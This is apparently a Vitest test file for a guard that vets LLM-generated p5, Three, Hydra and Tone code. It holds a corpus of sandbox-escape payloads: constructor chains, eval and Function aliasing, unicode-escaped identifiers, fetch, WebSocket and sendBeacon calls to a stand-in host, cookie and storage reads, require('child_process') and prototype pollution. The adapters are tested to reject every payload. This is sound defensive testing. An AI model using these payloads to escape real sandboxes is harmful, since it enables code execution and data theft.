/**
 * @vitest-environment jsdom
 *
 * Bypass corpus for the guards in front of eval / new Function.
 *
 * Every payload tries to reach a capability (Function constructor, eval,
 * fetch, XHR, WebSocket, storage, cookies, process/require, prototype
 * pollution, string timers) through a trick that a name-matching regex cannot
 * see. A payload "gets through" when it records an effect via `__pwn`. Each
 * one must be rejected at all four adapters that execute LLM output.
 */

import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { ToneAdapter } from '../../../src/composition/adapters/ToneAdapter.js';
import { ThreeAdapter } from '../../../src/composition/adapters/ThreeAdapter.js';
import { HydraAdapter } from '../../../src/composition/adapters/HydraAdapter.js';
import { P5Adapter } from '../../../src/composition/adapters/P5Adapter.js';
import { findGeneratedCodeViolations, GeneratedCodeViolation, compileGeneratedCode, createGeneratedCodeScope } from '../../../src/guardrails/GeneratedCodeGuard.js';
import type { SandboxedInstance } from '../../../src/composition/adapters/sandboxFrame.js';
import type { Layer } from '../../../src/composition/types.js';

vi.mock('../../../src/composition/adapters/sandboxFrame.js', async (importOriginal) => ({
  ...(await importOriginal<typeof import('../../../src/composition/adapters/sandboxFrame.js')>()),
  loadSandboxLib: async () => '/* stub vendored library */',
}));

interface Payload { id: string; code: string }

const PAYLOADS: Payload[] = [
  // constructor chains
  { id: 'ctor-chain', code: `[].constructor.constructor('__pwn("ctor-chain")')()` },
  { id: 'ctor-chain-bracket', code: `[]['constructor']['constructor']('__pwn("ctor-bracket")')()` },
  { id: 'ctor-chain-concat', code: `[]['con'+'structor']['con'+'structor']('__pwn("ctor-concat")')()` },
  { id: 'ctor-chain-template', code: '[][`con${"structor"}`][`con${"structor"}`]("__pwn(\\"ctor-tpl\\")")()' },
  { id: 'ctor-arrow', code: `(()=>1).constructor('__pwn("arrow-ctor")')()` },
  { id: 'ctor-async', code: `(async()=>1).constructor('__pwn("async-ctor")')()` },
  { id: 'ctor-string-literal', code: `''.constructor.constructor('__pwn("str-ctor")')()` },
  { id: 'ctor-destructure', code: `const { constructor: C } = []; C.constructor('__pwn("destructure-ctor")')()` },
  { id: 'ctor-destructure-computed', code: `const { ['con'+'structor']: C } = []; C['con'+'structor']('__pwn("destructure-computed")')()` },
  { id: 'ctor-sequence-key', code: `[][0,'constructor'][0,'constructor']('__pwn("seq-key")')()` },
  { id: 'ctor-via-this', code: `this.constructor.constructor('__pwn("this-ctor")')()` },
  { id: 'ctor-getproto', code: `Object.getPrototypeOf(function(){}).constructor('__pwn("getproto")')()` },
  { id: 'ctor-reflect', code: `Reflect.get(()=>1, 'constructor')('__pwn("reflect")')()` },
  { id: 'ctor-proto-prop', code: `[].__proto__.constructor.constructor('__pwn("proto-prop")')()` },
  // Function / eval via aliasing
  { id: 'function-alias', code: `const F = Function; F('__pwn("fn-alias")')()` },
  { id: 'function-tagged', code: 'Function`__pwn("tagged")`()' },
  { id: 'function-global-bracket', code: `globalThis['Func'+'tion']('__pwn("fn-global")')()` },
  { id: 'eval-alias', code: `const E = eval; E('__pwn("eval-alias")')` },
  { id: 'eval-indirect', code: `(0, eval)('__pwn("indirect-eval")')` },
  { id: 'eval-hex-string', code: `eval('\\x5f\\x5fpwn("hex")')` },
  { id: 'eval-comment-split', code: `eval/* split */('__pwn("eval-comment")')` },
  { id: 'eval-unicode-ident', code: `\\u0065val('__pwn("eval-unicode")')` },
  { id: 'eval-window-bracket', code: `window['ev'+'al']('__pwn("eval-window")')` },
  // bracket / concat / template property access to globals
  { id: 'fetch-concat', code: `globalThis['fe'+'tch']('https://evil.test')` },
  { id: 'fetch-template', code: 'globalThis[`fe${"tch"}`]("https://evil.test")' },
  { id: 'fetch-window-concat', code: `window['fe'+'tch']('https://evil.test')` },
  { id: 'fetch-self', code: `self.fetch('https://evil.test')` },
  { id: 'fetch-top', code: `top['fe'+'tch']('https://evil.test')` },
  { id: 'fetch-parent', code: `parent.fetch('https://evil.test')` },
  { id: 'fetch-unicode-ident', code: `\\u0066etch('https://evil.test')` },
  { id: 'fetch-unicode-member', code: `globalThis.\\u0066etch('https://evil.test')` },
  { id: 'fetch-comment-split', code: `fetch/**/('https://evil.test')` },
  { id: 'fetch-destructure', code: `const { fetch: f } = globalThis; f('https://evil.test')` },
  { id: 'fetch-with', code: `with (globalThis) fetch('https://evil.test');` },
  { id: 'fetch-with-window', code: `with (window) { fetch('https://evil.test'); }` },
  { id: 'fetch-reflect', code: `Reflect.get(globalThis, 'fetch')('https://evil.test')` },
  { id: 'fetch-this-global', code: `(function(){ return this })().fetch('https://evil.test')` },
  { id: 'fetch-bare', code: `fetch('https://evil.test')` },
  // other network / storage / process capabilities
  { id: 'xhr', code: `new window['XMLHttp'+'Request']().open('GET','x')` },
  { id: 'xhr-bare', code: `new XMLHttpRequest().open('GET','x')` },
  { id: 'websocket', code: `new globalThis['Web'+'Socket']('wss://evil.test')` },
  { id: 'websocket-unicode', code: `new \\u0057ebSocket('wss://evil.test')` },
  { id: 'worker', code: `new Worker('data:text/javascript,1')` },
  { id: 'localstorage', code: `window['local'+'Storage'].getItem('k')` },
  { id: 'localstorage-bare', code: `localStorage.getItem('k')` },
  { id: 'cookie', code: `__pwn('cookie:' + typeof document.cookie)` },
  { id: 'cookie-concat', code: `__pwn('cookie2:' + typeof document['coo'+'kie'])` },
  { id: 'cookie-via-dom', code: `__pwn('cookie3:' + typeof new Image().ownerDocument.cookie)` },
  { id: 'dom-window-reach', code: `new Image().ownerDocument.defaultView.fetch('https://evil.test')` },
  { id: 'dom-window-reach-concat', code: `new Image()['owner'+'Document']['default'+'View']['fe'+'tch']('https://evil.test')` },
  { id: 'beacon', code: `navigator.sendBeacon('https://evil.test', 'x')` },
  { id: 'process', code: `__pwn('process:' + typeof process)` },
  { id: 'process-global', code: `__pwn('process2:' + typeof globalThis['pro'+'cess'])` },
  { id: 'require', code: `require('child_process')` },
  { id: 'require-concat', code: `globalThis['req'+'uire']('fs')` },
  { id: 'location', code: `location = 'https://evil.test'` },
  { id: 'open', code: `open('https://evil.test')` },
  { id: 'indexeddb', code: `__pwn('idb:' + typeof indexedDB)` },
  // dynamic code loading
  { id: 'import', code: `import('data:text/javascript,globalThis.__pwn("import")')` },
  { id: 'import-comment', code: `import/* x */('data:text/javascript,1').then(m => __pwn('import2'))` },
  // string timers
  { id: 'timeout-string', code: `setTimeout('__pwn("timeout-str")', 0)` },
  { id: 'interval-string', code: 'setInterval(`__pwn("interval-str")`, 1)' },
  { id: 'timeout-alias', code: `const t = setTimeout; t('__pwn("timeout-alias")', 0)` },
  { id: 'timeout-var', code: `const s = '__pwn("timeout-var")'; setTimeout(s, 0)` },
  { id: 'timeout-window', code: `window['set'+'Timeout']('__pwn("timeout-window")', 0)` },
  // prototype pollution
  { id: 'pollute-object-proto', code: `Object.prototype.polluted = 1` },
  { id: 'pollute-proto-prop', code: `({}).__proto__.polluted = 1` },
  { id: 'pollute-array-proto', code: `[].__proto__.__proto__.polluted = 1` },
  { id: 'pollute-computed', code: `Object['proto'+'type'].polluted = 1` },
  { id: 'pollute-define', code: `Object.defineProperty(Object.prototype, 'polluted', { value: 1, configurable: true })` },
  { id: 'pollute-setproto', code: `Object.setPrototypeOf({}, { polluted: 1 }); Object.prototype.polluted = 1` },
  { id: 'pollute-ctor', code: `({}).constructor.prototype.polluted = 1` },
];

type Runner = (code: string) => void;

function layerOf(type: Layer['type'], code: string): Layer {
  return {
    id: `bypass-${type}`,
    type,
    code,
    config: { zIndex: 1, blendMode: 'normal', opacity: 1, position: { x: 0, y: 0 }, scale: 1 },
    metadata: { prompt: 'bypass', generator: 'test', model: 'test', generatedAt: new Date().toISOString() },
    enabled: true,
    locked: false,
  };
}

const win = window as unknown as Record<string, unknown>;

describe('generated-code bypass corpus', () => {
  const effects: string[] = [];
  const saved = new Map<string, PropertyDescriptor | undefined>();

  const pwn = (id: string): void => { effects.push(id); };

  function stub(name: string, value: unknown) {
    if (!saved.has(name)) saved.set(name, Object.getOwnPropertyDescriptor(window, name));
    Object.defineProperty(window, name, { configurable: true, writable: true, value });
  }

  beforeEach(() => {
    effects.length = 0;
    vi.useFakeTimers();
    win.__pwn = pwn;
    stub('fetch', () => pwn('fetch'));
    stub('XMLHttpRequest', class { open() { pwn('xhr'); } });
    stub('WebSocket', class { constructor() { pwn('websocket'); } });
    stub('Worker', class { constructor() { pwn('worker'); } });
    stub('localStorage', { getItem: () => pwn('localStorage') });
    stub('require', () => pwn('require'));
    stub('indexedDB', { open: () => pwn('indexedDB') });
    stub('open', () => pwn('open'));
    stub('Image', class { ownerDocument = { cookie: '', defaultView: { fetch: () => pwn('dom-fetch') } }; });
    Object.defineProperty(navigator, 'sendBeacon', { configurable: true, value: () => pwn('beacon') });
    vi.spyOn(window, 'requestAnimationFrame').mockReturnValue(1);
    vi.spyOn(window, 'cancelAnimationFrame').mockImplementation(() => {});
  });

  afterEach(() => {
    vi.clearAllTimers();
    vi.useRealTimers();
    vi.restoreAllMocks();
    for (const [name, descriptor] of saved) {
      if (descriptor) Object.defineProperty(window, name, descriptor);
      else Reflect.deleteProperty(window, name);
    }
    saved.clear();
    Reflect.deleteProperty(navigator, 'sendBeacon');
    Reflect.deleteProperty(window, '__pwn');
    Reflect.deleteProperty(window, 'Tone');
    Reflect.deleteProperty(window, 'THREE');
    Reflect.deleteProperty(window, 'Hydra');
    Reflect.deleteProperty(window, 'p5');
  });

  function collect(run: () => void): string[] {
    try { run(); } catch { /* a thrown rejection is a valid outcome */ }
    try { vi.runOnlyPendingTimers(); } catch { /* ditto */ }
    if (Object.prototype.hasOwnProperty.call(Object.prototype, 'polluted')) {
      effects.push('prototype-pollution');
      Reflect.deleteProperty(Object.prototype, 'polluted');
    }
    return [...effects];
  }

  // The vendored libraries are replaced by a stub: these tests are about what
  // the guard lets through, not about p5/three/etc. themselves.
  const runners: Record<string, () => Promise<Runner>> = {
    tone: async () => {
      const adapter = new ToneAdapter();
      await adapter.initialize();
      return (code) => { adapter.render(layerOf('tone', code), document.createElement('div')); };
    },
    three: async () => {
      const adapter = new ThreeAdapter();
      await adapter.initialize();
      return (code) => { adapter.render(layerOf('three', code), document.createElement('div')); };
    },
    hydra: async () => {
      const adapter = new HydraAdapter();
      await adapter.initialize();
      return (code) => { adapter.render(layerOf('hydra', code), document.createElement('div')); };
    },
    p5: async () => {
      const adapter = new P5Adapter();
      await adapter.initialize();
      return (code) => {
        adapter.render(layerOf('p5', `function setup() { ${code} }\nfunction draw() {}`), document.createElement('div'));
      };
    },
  };

  for (const [adapterName, makeRunner] of Object.entries(runners)) {
    describe(adapterName, () => {
      for (const payload of PAYLOADS) {
        // The p5 adapter extracts the body with a non-greedy `{...}` match, so
        // a payload containing a closing brace cannot be hosted in it.
        if (adapterName === 'p5' && payload.code.includes('}')) continue;
        it(`rejects ${payload.id}`, async () => {
          const run = await makeRunner();
          expect(collect(() => run(payload.code))).toEqual([]);
        });
      }
    });
  }

  describe('legitimate art code is mounted in a sandbox frame, never run in the host', () => {
    const mountLegit = async (type: Layer['type'], code: string) => {
      const adapters = { hydra: new HydraAdapter(), p5: new P5Adapter(), tone: new ToneAdapter(), three: new ThreeAdapter() } as const;
      const adapter = adapters[type as keyof typeof adapters];
      await adapter.initialize();
      return adapter.render(layerOf(type, code), document.createElement('div')) as unknown as SandboxedInstance;
    };

    it('hydra chain with a probe call', async () => {
      const inst = await mountLegit('hydra', `__pwn('hydra:' + [1, 2][1])`);
      expect(inst.blocked).toEqual([]);
      expect(inst.iframe?.getAttribute('sandbox')).toBe('allow-scripts');
      expect(effects).toEqual([]);
    });

    it('p5 sketch with array indexing, objects and this', async () => {
      const inst = await mountLegit('p5', `function setup() { const a = [1,2,3]; for (let i = 0; i < a.length; i++) a[i] *= 2; __pwn('p5:' + a.join()); }\nfunction draw() {}`);
      expect(inst.blocked).toEqual([]);
      expect(inst.iframe?.getAttribute('sandbox')).toBe('allow-scripts');
      expect(effects).toEqual([]);
    });

    it('tone synth tracking, constructor functions with this, computed numeric keys', async () => {
      const inst = await mountLegit('tone', `const s = new Tone.Synth().toDestination(); const parent = 3; function Part(n) { this.v = n; } const o = new Part(4); const key = 'v'; o[key] += parent; __pwn('legit:' + o.v);`);
      expect(inst.blocked).toEqual([]);
      expect(inst.iframe?.getAttribute('sandbox')).toBe('allow-scripts');
      expect(effects).toEqual([]);
    });

    it('three code may redeclare names and shadow reserved-looking ones', async () => {
      const inst = await mountLegit('three', `const scene2 = new THREE.Scene(); const top = 1; const open = (n) => n + top; __pwn('three:' + open(1));`);
      expect(inst.blocked).toEqual([]);
      expect(inst.iframe?.getAttribute('sandbox')).toBe('allow-scripts');
      expect(effects).toEqual([]);
    });
  });
});

describe('GeneratedCodeGuard on realistic generated sketches', () => {
  const SKETCHES: Record<string, string> = {
    hydra: `
      s0.initCam();
      osc(() => 10 + 5 * Math.sin(time * 0.2), 0.1, 1.2)
        .kaleid(4).modulate(noise(3, 0.1), 0.05).rotate(function () { return time * 0.1 })
        .blend(src(s0), 0.3).out(o0);`,
    p5: `
      const cells = [];
      for (let i = 0; i < 20; i++) { cells[i] = []; for (let j = 0; j < 20; j++) cells[i][j] = (i * j) % 7; }
      class Mover { constructor(parent) { this.parent = parent; this.x = 0; } step() { this.x += this.parent.speed; return this; } }
      const m = new Mover({ speed: 2 }).step();
      const grid = cells.map((row, r) => row.map((v, c) => v + r - c));
      p.fill(grid[3][4] * 10, m.x, 120);
      setTimeout(() => p.noLoop(), 1000);`,
    three: `
      const geo = new THREE.BoxGeometry(1, 1, 1);
      const meshes = [];
      for (let i = 0; i < 5; i++) { const mesh = new THREE.Mesh(geo, new THREE.MeshBasicMaterial({ color: 0xff0000 })); mesh.position.x = i; meshes[i] = mesh; scene.add(mesh); }
      function animate() { requestAnimationFrame(animate); meshes.forEach((m, i) => { m.rotation.y += 0.01 * (i + 1); }); renderer.render(scene, camera); }
      animate();`,
    tone: `
      const synth = new Tone.Synth().toDestination();
      const notes = ['C4', 'E4', 'G4'];
      let idx = 0;
      Tone.Transport.scheduleRepeat((time) => { synth.triggerAttackRelease(notes[idx++ % notes.length], '8n', time); }, '8n');
      Tone.Transport.bpm.value = 96;`,
  };

  for (const [name, code] of Object.entries(SKETCHES)) {
    it(`passes ${name} sketch`, () => {
      expect(findGeneratedCodeViolations(code)).toEqual([]);
    });
  }

  it('reports every distinct violation once, with names', () => {
    expect(findGeneratedCodeViolations(`fetch('x'); fetch('y'); window.alert(1); a.constructor`)).toEqual([
      'global "fetch"',
      'global "window"',
      'property "constructor"',
    ]);
  });

  it('rejects empty-input style garbage and unparseable code', () => {
    expect(findGeneratedCodeViolations('const = ;')[0]).toMatch(/^unparseable code:/);
    expect(() => compileGeneratedCode('osc(', {})).toThrow(GeneratedCodeViolation);
  });

  it('runtime key guard coerces keys once, so a flipping toString cannot smuggle constructor', () => {
    let calls = 0;
    const key = { toString: () => (calls++ === 0 ? 'safe' : 'constructor') };
    const result = compileGeneratedCode('const o = { safe: 1 }; return o[k];', { k: key })();
    expect(result).toBe(1);
    expect(() => compileGeneratedCode('return []["con" + "structor"];')()).toThrow(GeneratedCodeViolation);
  });
});

describe('GeneratedCodeGuard review follow-ups (GLM pass on #1527)', () => {
  it.each([
    ['builtin alias prototype write', 'const O = Object; O.prototype.polluted = 1', 'property "prototype"'],
    ['destructured prototype', 'const { prototype: P } = Object; P.polluted = 1', 'property "prototype"'],
    ['event.view reach', 'const f = (e) => e.view.alert(1)', 'property "view"'],
    ['composedPath reach', 'const f = (e) => e.composedPath()', 'property "composedPath"'],
    ['window as property', 'p.window.alert(1)', 'property "window"'],
    ['object literal __proto__', 'const o = { __proto__: p }', 'property "__proto__"'],
    ['free __proto__', '__proto__.polluted = 1', 'global "__proto__"'],
    ['free constructor', 'constructor.name', 'global "constructor"'],
  ])('rejects %s statically', (_label, code, violation) => {
    expect(findGeneratedCodeViolations(code)).toContain(violation);
  });

  it('rejects window/eval/prototype keys built at runtime', () => {
    const env = { p: { window: { eval: () => 'pwned' } } };
    expect(() => compileGeneratedCode(`return p['win' + 'dow']`, env)()).toThrow(GeneratedCodeViolation);
    expect(() => compileGeneratedCode(`const O = Object; return O['proto' + 'type']`)()).toThrow(GeneratedCodeViolation);
  });

  it('allows timers with function references and wrappers, but refuses strings at runtime', () => {
    vi.useFakeTimers();
    try {
      const hits: string[] = [];
      const p = { noLoop: () => hits.push('noLoop') };
      compileGeneratedCode('setTimeout(p.noLoop, 100); const delay = (fn) => setTimeout(fn, 50); delay(() => p.noLoop());', { p })();
      vi.runOnlyPendingTimers();
      expect(hits).toEqual(['noLoop', 'noLoop']);
      expect(() => compileGeneratedCode(`const s = 'x'; setTimeout(s, 0)`)()).toThrow('setTimeout without a function argument');
      expect(() => compileGeneratedCode(`const t = setInterval; t('x', 0)`)()).toThrow('setInterval without a function argument');
      expect(findGeneratedCodeViolations(`setTimeout('x', 0)`)).toEqual(['setTimeout without a function argument']);
    } finally {
      vi.useRealTimers();
    }
  });

  it('gives generated code its own empty arguments, not the wrapper internals', () => {
    expect(compileGeneratedCode('return arguments.length', { a: 1 })()).toBe(0);
  });

  it('keeps sloppy-style undeclared variables on a shared scope, never on window', () => {
    const scope = createGeneratedCodeScope();
    const win = window as unknown as Record<string, unknown>;
    compileGeneratedCode('counter = 1; pos = { counter }', {}, scope)();
    const read = compileGeneratedCode('counter += 1; return [counter, pos.counter, typeof neverSet]', {}, scope);
    expect(read()).toEqual([2, 1, 'undefined']);
    expect(scope.counter).toBe(2);
    expect('counter' in win).toBe(false);
    expect('pos' in win).toBe(false);
  });

  it('refuses a scope that has a prototype', () => {
    expect(() => compileGeneratedCode('x = 1', {}, {})).toThrow(TypeError);
  });
});
